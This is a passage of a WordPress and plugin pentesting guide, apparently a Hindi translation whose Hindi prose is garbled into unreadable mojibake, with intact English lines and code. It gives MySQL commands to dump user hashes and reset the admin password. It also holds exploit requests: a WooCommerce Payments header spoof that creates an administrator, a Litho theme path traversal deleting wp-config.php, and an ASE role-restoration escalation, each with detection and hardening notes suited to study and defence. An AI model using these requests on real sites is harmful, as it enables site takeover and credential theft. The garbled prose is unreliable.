рдпрд╣ рд╕рд╛рдордЧреНрд░реА WordPress dashboard рдореЗрдВ plugin install рдФрд░ activate рдХрд░рдиреЗ рдХреЗ рдЪрд░рдгреЛрдВ рдХреЛ рджрд┐рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ visual aids рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА vulnerabilities рдХрд╛ exploitation рдЙрдЪрд┐рдд рдЕрдиреБрдорддрд┐ рдХреЗ рдмрд┐рдирд╛ illegal рдФрд░ unethical рд╣реИред рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдЬрд┐рдореНрдореЗрджрд╛рд░реА рд╕реЗ рдФрд░ рдХреЗрд╡рд▓ рдХрд╛рдиреВрдиреА рдкрд░рд┐рдкреНрд░реЗрдХреНрд╖реНрдп рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ explicit рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде penetration testingред

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## XSS рд╕реЗ RCE рддрдХ

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ рдПрдХ script рд╣реИ рдЬрд┐рд╕реЗ **Cross-Site Scripting (XSS)** vulnerability рдХреЛ **Remote Code Execution (RCE)** рдпрд╛ WordPress рдореЗрдВ рдЕрдиреНрдп critical vulnerabilities рдореЗрдВ escalate рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) рджреЗрдЦреЗрдВред рдпрд╣ **Wordpress Versions 6.X.X, 5.X.X and 4.X.X** рдХреЗ рд▓рд┐рдП support рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
- _**Privilege Escalation:**_ WordPress рдореЗрдВ рдПрдХ user рдмрдирд╛рддрд╛ рд╣реИред
- _**(RCE) Custom Plugin (backdoor) Upload:**_ рдЕрдкрдирд╛ custom plugin (backdoor) WordPress рдкрд░ upload рдХрд░реЗрдВред
- _**(RCE) Built-In Plugin Edit:**_ WordPress рдХреЗ Built-In Plugins рдХреЛ edit рдХрд░реЗрдВред
- _**(RCE) Built-In Theme Edit:**_ WordPress рдХреЗ Built-In Themes рдХреЛ edit рдХрд░реЗрдВред
- _**(Custom) Custom Exploits:**_ Third-Party WordPress Plugins/Themes рдХреЗ рд▓рд┐рдП custom exploitsред

## Post Exploitation

usernames рдФрд░ passwords рдирд┐рдХрд╛рд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin password рдмрджрд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress рдкреНрд▓рдЧрдЗрдиреНрд╕ Pentest

### рд╣рдорд▓рд╛ рд╕рддрд╣

рдпрд╣ рдЬрд╛рдирдирд╛ рдХрд┐ рдХреЛрдИ Wordpress рдкреНрд▓рдЧрдЗрди рдЕрдкрдиреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреИрд╕реЗ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЙрд╕рдХреА рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдЖрдк рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдмрд┐рдВрджреБрдУрдВ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдкреНрд▓рдЧрдЗрди рдХрд┐рд╕ рддрд░рд╣ рд╕реЗ functionality рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рдХрдордЬреЛрд░ рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЗ рд▓рд┐рдП [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) рджреЗрдЦреЗрдВред

- **`wp_ajax`**

рдПрдХ рддрд░реАрдХрд╛ рдЬрд┐рд╕рд╕реЗ рдХреЛрдИ рдкреНрд▓рдЧрдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рд╡рд╣ рд╣реИ AJAX handlers рдХреЗ рдЬрд░рд┐рдПред рдЗрдирдореЗрдВ logic, authorization, рдпрд╛ authentication bugs рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдХреНрд╕рд░ рдпреЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ authentication рдФрд░ authorization рджреЛрдиреЛрдВ рдХреЛ Wordpress nonce рдХреЗ рдЕрд╕реНрддрд┐рддреНрд╡ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд░рдЦрддреА рд╣реИрдВ, рдЬреЛ **рдХрд┐рд╕реА рднреА user рдЬрд┐рд╕реЗ Wordpress instance рдореЗрдВ authenticated рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рдХреЗ рдкрд╛рд╕ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдЙрд╕рдХреЗ role рдХреА рдкрд░рд╡рд╛рд╣ рдХрд┐рдП рдмрд┐рдирд╛)ред

рдпреЗ рд╡реЗ functions рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдкреНрд▓рдЧрдЗрди рдореЗрдВ рдХрд┐рд╕реА function рдХреЛ expose рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv` рдХреЗ рдЙрдкрдпреЛрдЧ рд╕реЗ endpoint рдХрд┐рд╕реА рднреА user рдХреЗ рд▓рд┐рдП accessible рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдЕрдкреНрд░рдорд╛рдгреАрдХреГрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рднреА)ред**

> [!CAUTION]
> рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреА рдЬрд╛рдБрдЪ рдХреЗрд╡рд▓ `wp_verify_nonce` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рд╕рд┐рд░реНрдл рдпрд╣ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рд╣реИ; рдпрд╣ рдЖрдо рддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рднреВрдорд┐рдХрд╛ рдХреА рдЬрд╛рдБрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ред рдЗрд╕рд▓рд┐рдП рдХрдо-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЪреНрдЪ-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реА рдХрд╛рд░реНрд░рд╡рд╛рдЗрдпреЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

- **REST API**

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ wordpress рд╕реЗ рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЛ expose рдХрд┐рдпрд╛ рдЬрд╛рдП, `register_rest_route` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ REST API рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рдХреЗ:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` рдПрдХ callback рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬреЛ рдЬрд╛рдБрдЪрддрд╛ рд╣реИ рдХрд┐ рджрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ API method рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХреГрдд рд╣реИ рдпрд╛ рдирд╣реАрдВред

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **php рдлрд╝рд╛рдЗрд▓ рддрдХ рд╕реАрдзреЗ рдПрдХреНрд╕реЗрд╕**

рдмреЗрд╢рдХ, Wordpress PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ plugins рдХреЗ рдЕрдВрджрд░ рдХреА files рд╡реЗрдм рд╕реЗ рд╕реАрдзреЗ рдЙрдкрд▓рдмреНрдз рд╣реЛрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХрд┐рд╕реА plugin рдореЗрдВ рдРрд╕реА рдХреЛрдИ vulnerable functionality рдПрдХреНрд╕рдкреЛрдЬрд╝ рд╣реЛ рд░рд╣реА рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдорд╛рддреНрд░ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛ рдЬрд╛рддреА рд╣реИ, рддреЛ рдЙрд╕реЗ рдХреЛрдИ рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ exploit рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### Trusted-header REST impersonation (WooCommerce Payments тЙд 5.6.1)

рдХреБрдЫ plugins internal integrations рдпрд╛ reverse proxies рдХреЗ рд▓рд┐рдП тАЬtrusted headerтАЭ рд╢реЙрд░реНрдЯрдХрдЯ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЙрд╕ header рдХрд╛ рдЙрдкрдпреЛрдЧ REST requests рдХреЗ рд▓рд┐рдП рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ context рд╕реЗрдЯ рдХрд░рдиреЗ рд╣реЗрддреБ рдХрд░рддреЗ рд╣реИрдВред рдпрджрд┐ рд╡рд╣ header рдХрд┐рд╕реА upstream component рджреНрд╡рд╛рд░рд╛ cryptographically request рд╕реЗ рдмрд╛рдЙрдВрдб рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ attacker рдЙрд╕реЗ spoof рдХрд░рдХреЗ privileged REST routes рдХреЛ administrator рдХреЗ рд░реВрдк рдореЗрдВ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

- рдкреНрд░рднрд╛рд╡: рдЕрдирдСрдереЗрдиреНрдЯрд┐рдХреЗрдЯреЗрдб privilege escalation to admin тАФ core users REST route рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирдпрд╛ administrator рдмрдирд╛рдХрд░ред
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (forces user ID 1, typically the first administrator account).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- рдкреНрд▓рдЧрдЗрди рдХреНрд▓рд╛рдЗрдВрдЯ-рдирд┐рдпрдВрддреНрд░рд┐рдд header рдХреЛ authentication state рд╕реЗ рдореИрдк рдХрд░рддрд╛ рд╣реИ рдФрд░ capability checks рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИред
- WordPress core рдЗрд╕ route рдХреЗ рд▓рд┐рдП `create_users` capability рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ; рдкреНрд▓рдЧрдЗрди рдХрд╛ hack рдЗрд╕реЗ bypass рдХрд░ рджреЗрддрд╛ рд╣реИ тАФ рд╕реАрдзреЗ header рд╕реЗ current user context рд╕реЗрдЯ рдХрд░рдХреЗред

Expected success indicators

- HTTP 201 with a JSON body describing the created user.
- A new admin user visible in `wp-admin/users.php`.

Detection checklist

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Review REST registrations for privileged callbacks that lack robust `permission_callback` checks and instead rely on request headers.
- Look for usages of core user-management functions (`wp_insert_user`, `wp_create_user`) inside REST handlers that are gated only by header values.

Hardening

- Never derive authentication or authorization from client-controlled headers.
- If a reverse proxy must inject identity, terminate trust at the proxy and strip inbound copies (e.g., `unset X-Wcpay-Platform-Checkout-User` at the edge), then pass a signed token and verify it server-side.
- For REST routes performing privileged actions, require `current_user_can()` checks and a strict `permission_callback` (do NOT use `__return_true`).
- Prefer first-party auth (cookies, application passwords, OAuth) over header тАЬimpersonationтАЭ.

References: see the links at the end of this page for a public case and broader analysis.

### wp_ajax_nopriv рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдорд╛рдгрд┐рдХрддрд╛-рд░рд╣рд┐рдд рдордирдорд╛рдирд╛ рдлрд╝рд╛рдЗрд▓ рд╡рд┐рд▓реЛрдкрди (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
рдЗрд╕ рд╕реНрдирд┐рдкреЗрдЯ рд╕реЗ рдЙрддреНрдкрдиреНрди рд╕рдорд╕реНрдпрд╛рдПрдБ:

* **рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдкрд╣реБрдБрдЪ** тАУ `wp_ajax_nopriv_` hook рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
* **No nonce / capability check** тАУ рдХреЛрдИ рднреА visitor endpoint рдХреЛ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **No path sanitisation** тАУ userтАУcontrolled `fontfamily` string рдмрд┐рдирд╛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ filesystem path рдореЗрдВ concatenate рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ classic `../../` traversal рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

#### рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ single HTTP POST request рднреЗрдЬрдХрд░ рдХрд┐рд╕реА рднреА рдлрд╛рдЗрд▓ рдпрд╛ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ **uploads base directory рдХреЗ рдиреАрдЪреЗ** (рдЖрдорддреМрд░ рдкрд░ `<wp-root>/wp-content/uploads/`) рд╕реЗ рдбрд┐рд▓реАрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
рдЪреВрдБрдХрд┐ `wp-config.php` *uploads* рдХреЗ рдмрд╛рд╣рд░ рд░рд╣рддрд╛ рд╣реИ, рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдкрд░ рдЪрд╛рд░ `../` рдЕрдиреБрдХреНрд░рдо рдкрд░реНрдпрд╛рдкреНрдд рд╣реЛрддреЗ рд╣реИрдВред `wp-config.php` рдХреЛ рд╣рдЯрд╛рдиреЗ рдкрд░ рдЕрдЧрд▓реА рд╡рд┐рдЬрд╝рд┐рдЯ рдкрд░ WordPress рдХреЛ *рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рд╡рд┐рдЬрд╝рд╛рд░реНрдб* рдореЗрдВ рдбрд╛рд▓ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреВрд░рд╛ рд╕рд╛рдЗрдЯ рдЯреЗрдХрдУрд╡рд░ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ (рд╣рдорд▓рд╛рд╡рд░ рдХреЗрд╡рд▓ рдирдпрд╛ DB рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рджреЗрддрд╛ рд╣реИ рдФрд░ рдПрдХ рдПрдбрдорд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рддрд╛ рд╣реИ)ред

рдЕрдиреНрдп рдкреНрд░рднрд╛рд╡рд╢рд╛рд▓реА рд▓рдХреНрд╖реНрдп plugin/theme `.php` files (рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХреЛ рддреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП) рдпрд╛ `.htaccess` rules рд╣реИрдВред

#### Detection checklist

* рдХреЛрдИ рднреА `add_action( 'wp_ajax_nopriv_...')` callback рдЬреЛ filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, рдЖрджрд┐) рдХреЛ рдХреЙрд▓ рдХрд░реЗред
* рдкрдереЛрдВ рдореЗрдВ рдЕрд╕реИрдирд┐рдЯрд╛рдЗрдЬреНрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХрд╛ рд╕рдВрдпреЛрдЬрди (рджреЗрдЦреЗрдВ `$_POST`, `$_GET`, `$_REQUEST`)ред
* `check_ajax_referer()` рдФрд░ `current_user_can()`/`is_user_logged_in()` рдХрд╛ рдЕрднрд╛рд╡ред

#### рдХрдареЛрд░рдХрд░рдг
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// тАж proceed тАж
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ЁЯФТ  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Always** рдХрд┐рд╕реА рднреА disk рдкрд░ write/delete рдСрдкрд░реЗрд╢рди рдХреЛ privileged рд╕рдордЭреЗрдВ рдФрд░ рдирд┐рдореНрди рдХреА рд╕рд╛рд╡рдзрд╛рдиреАрдкреВрд░реНрд╡рдХ рдЬрд╛рдБрдЪ рдХрд░реЗрдВ:
> тАв Authentication  тАв Authorisation  тАв Nonce  тАв Input sanitisation  тАв Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation: stale role restoration рдФрд░ missing authorization рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (ASE "View Admin as Role")

рдХрдИ plugins "view as role" рдпрд╛ temporary role-switching рдлрд╝реАрдЪрд░ implement рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ original role(s) рдХреЛ user meta рдореЗрдВ рд╕реЗрд╡ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдмрд╛рдж рдореЗрдВ restore рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдпрджрд┐ restoration path рдХреЗрд╡рд▓ request parameters (рдЙрджрд╛., `$_REQUEST['reset-for']`) рдФрд░ plugin-maintained list рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ capabilities рддрдерд╛ рд╡реИрдз nonce рдХреА рдЬрд╛рдБрдЪ рдирд╣реАрдВ рдХрд░рддрд╛, рддреЛ рдпрд╣ рдПрдХ vertical privilege escalation рдмрди рдЬрд╛рддрд╛ рд╣реИред

рдПрдХ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЙрджрд╛рд╣рд░рдг Admin and Site Enhancements (ASE) plugin (тЙд 7.6.2.1) рдореЗрдВ рдкрд╛рдпрд╛ рдЧрдпрд╛ред reset branch рдиреЗ roles рдХреЛ `reset-for=<username>` рдХреЗ рдЖрдзрд╛рд░ рдкрд░ restore рдХрд┐рдпрд╛ рдЕрдЧрд░ username internal array `$options['viewing_admin_as_role_are']` рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рдерд╛, рд▓реЗрдХрд┐рди current roles рдХреЛ рд╣рдЯрд╛рдиреЗ рдФрд░ user meta `_asenha_view_admin_as_original_roles` рд╕реЗ saved roles рдХреЛ рдлрд┐рд░ рд╕реЗ рдЬреЛрдбрд╝рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рди рддреЛ `current_user_can()` рдЪреЗрдХ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рди рд╣реА nonce verification рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
рдХреНрдпреЛрдВ рдпрд╣ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рд╣реИ

- `$_REQUEST['reset-for']` рдФрд░ рдПрдХ plugin option рдХреЛ рдмрд┐рдирд╛ server-side authorization рдХреЗ рднрд░реЛрд╕рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
- рдЕрдЧрд░ рдХрд┐рд╕реА user рдХреЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ `_asenha_view_admin_as_original_roles` рдореЗрдВ higher privileges рд╕рд╣реЗрдЬреЗ рд╣реБрдП рдереЗ рдФрд░ рдЙрдиреНрд╣реЗрдВ downgraded рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛, рддреЛ рд╡реЗ reset path рдкрд░ рдЬрд╛рдХрд░ рдЙрдиреНрд╣реЗрдВ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- рдХреБрдЫ deployments рдореЗрдВ, рдХреЛрдИ рднреА authenticated user `viewing_admin_as_role_are` рдореЗрдВ рдЕрднреА рднреА рдореМрдЬреВрдж рдХрд┐рд╕реА рдЕрдиреНрдп username рдХреЗ рд▓рд┐рдП reset trigger рдХрд░ рд╕рдХрддрд╛ рд╣реИ (broken authorization)ред

рд╣рдорд▓реЗ рдХреА рдкреВрд░реНрд╡-рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдБ

- Vulnerable plugin version рдЬрд┐рд╕рдореЗрдВ рдпрд╣ feature enabled рд╣реЛред
- рд▓рдХреНрд╖рд┐рдд account рдХреЗ user meta рдореЗрдВ рдкрд╣рд▓реЗ рдХреЗ рдЙрдкрдпреЛрдЧ рд╕реЗ рдПрдХ stale high-privilege role рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред
- рдХреЛрдИ рднреА authenticated session; reset flow рдкрд░ nonce/capability рдЕрдиреБрдкрд╕реНрдерд┐рдд рд╣реЛрдирд╛ред

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
рдХрдордЬреЛрд░ рдмрд┐рд▓реНрдб рдкрд░ рдпрд╣ рд╡рд░реНрддрдорд╛рди рднреВрдорд┐рдХрд╛рдУрдВ рдХреЛ рд╣рдЯрд╛ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╕рд╣реЗрдЬреА рдЧрдИ рдореВрд▓ рднреВрдорд┐рдХрд╛рдПрдБ (рдЙрджрд╛., `administrator`) рдлрд┐рд░ рд╕реЗ рдЬреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдмрдврд╝ рдЬрд╛рддреА рд╣реИрдВред

Detection checklist

- рдРрд╕реА role-switching рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ user meta рдореЗрдВ тАЬoriginal rolesтАЭ рдХреЛ рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддреА рд╣реИрдВ (рдЙрджрд╛., `_asenha_view_admin_as_original_roles`)ред
- рдЙрди reset/restore paths рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ рдЬреЛ:
- рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдореЛрдВ рдХреЛ `$_REQUEST` / `$_GET` / `$_POST` рд╕реЗ рдкрдврд╝рддреЗ рд╣реИрдВред
- `add_role()` / `remove_role()` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ roles рдХреЛ modify рдХрд░рддреЗ рд╣реИрдВ рдмрд┐рдирд╛ `current_user_can()` рдФрд░ `wp_verify_nonce()` / `check_admin_referer()` рдХреЗред
- plugin option array (рдЙрджрд╛., `viewing_admin_as_role_are`) рдХреЗ рдЖрдзрд╛рд░ рдкрд░ authorize рдХрд░рддреЗ рд╣реИрдВ рдмрдЬрд╛рдп рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗред

Hardening

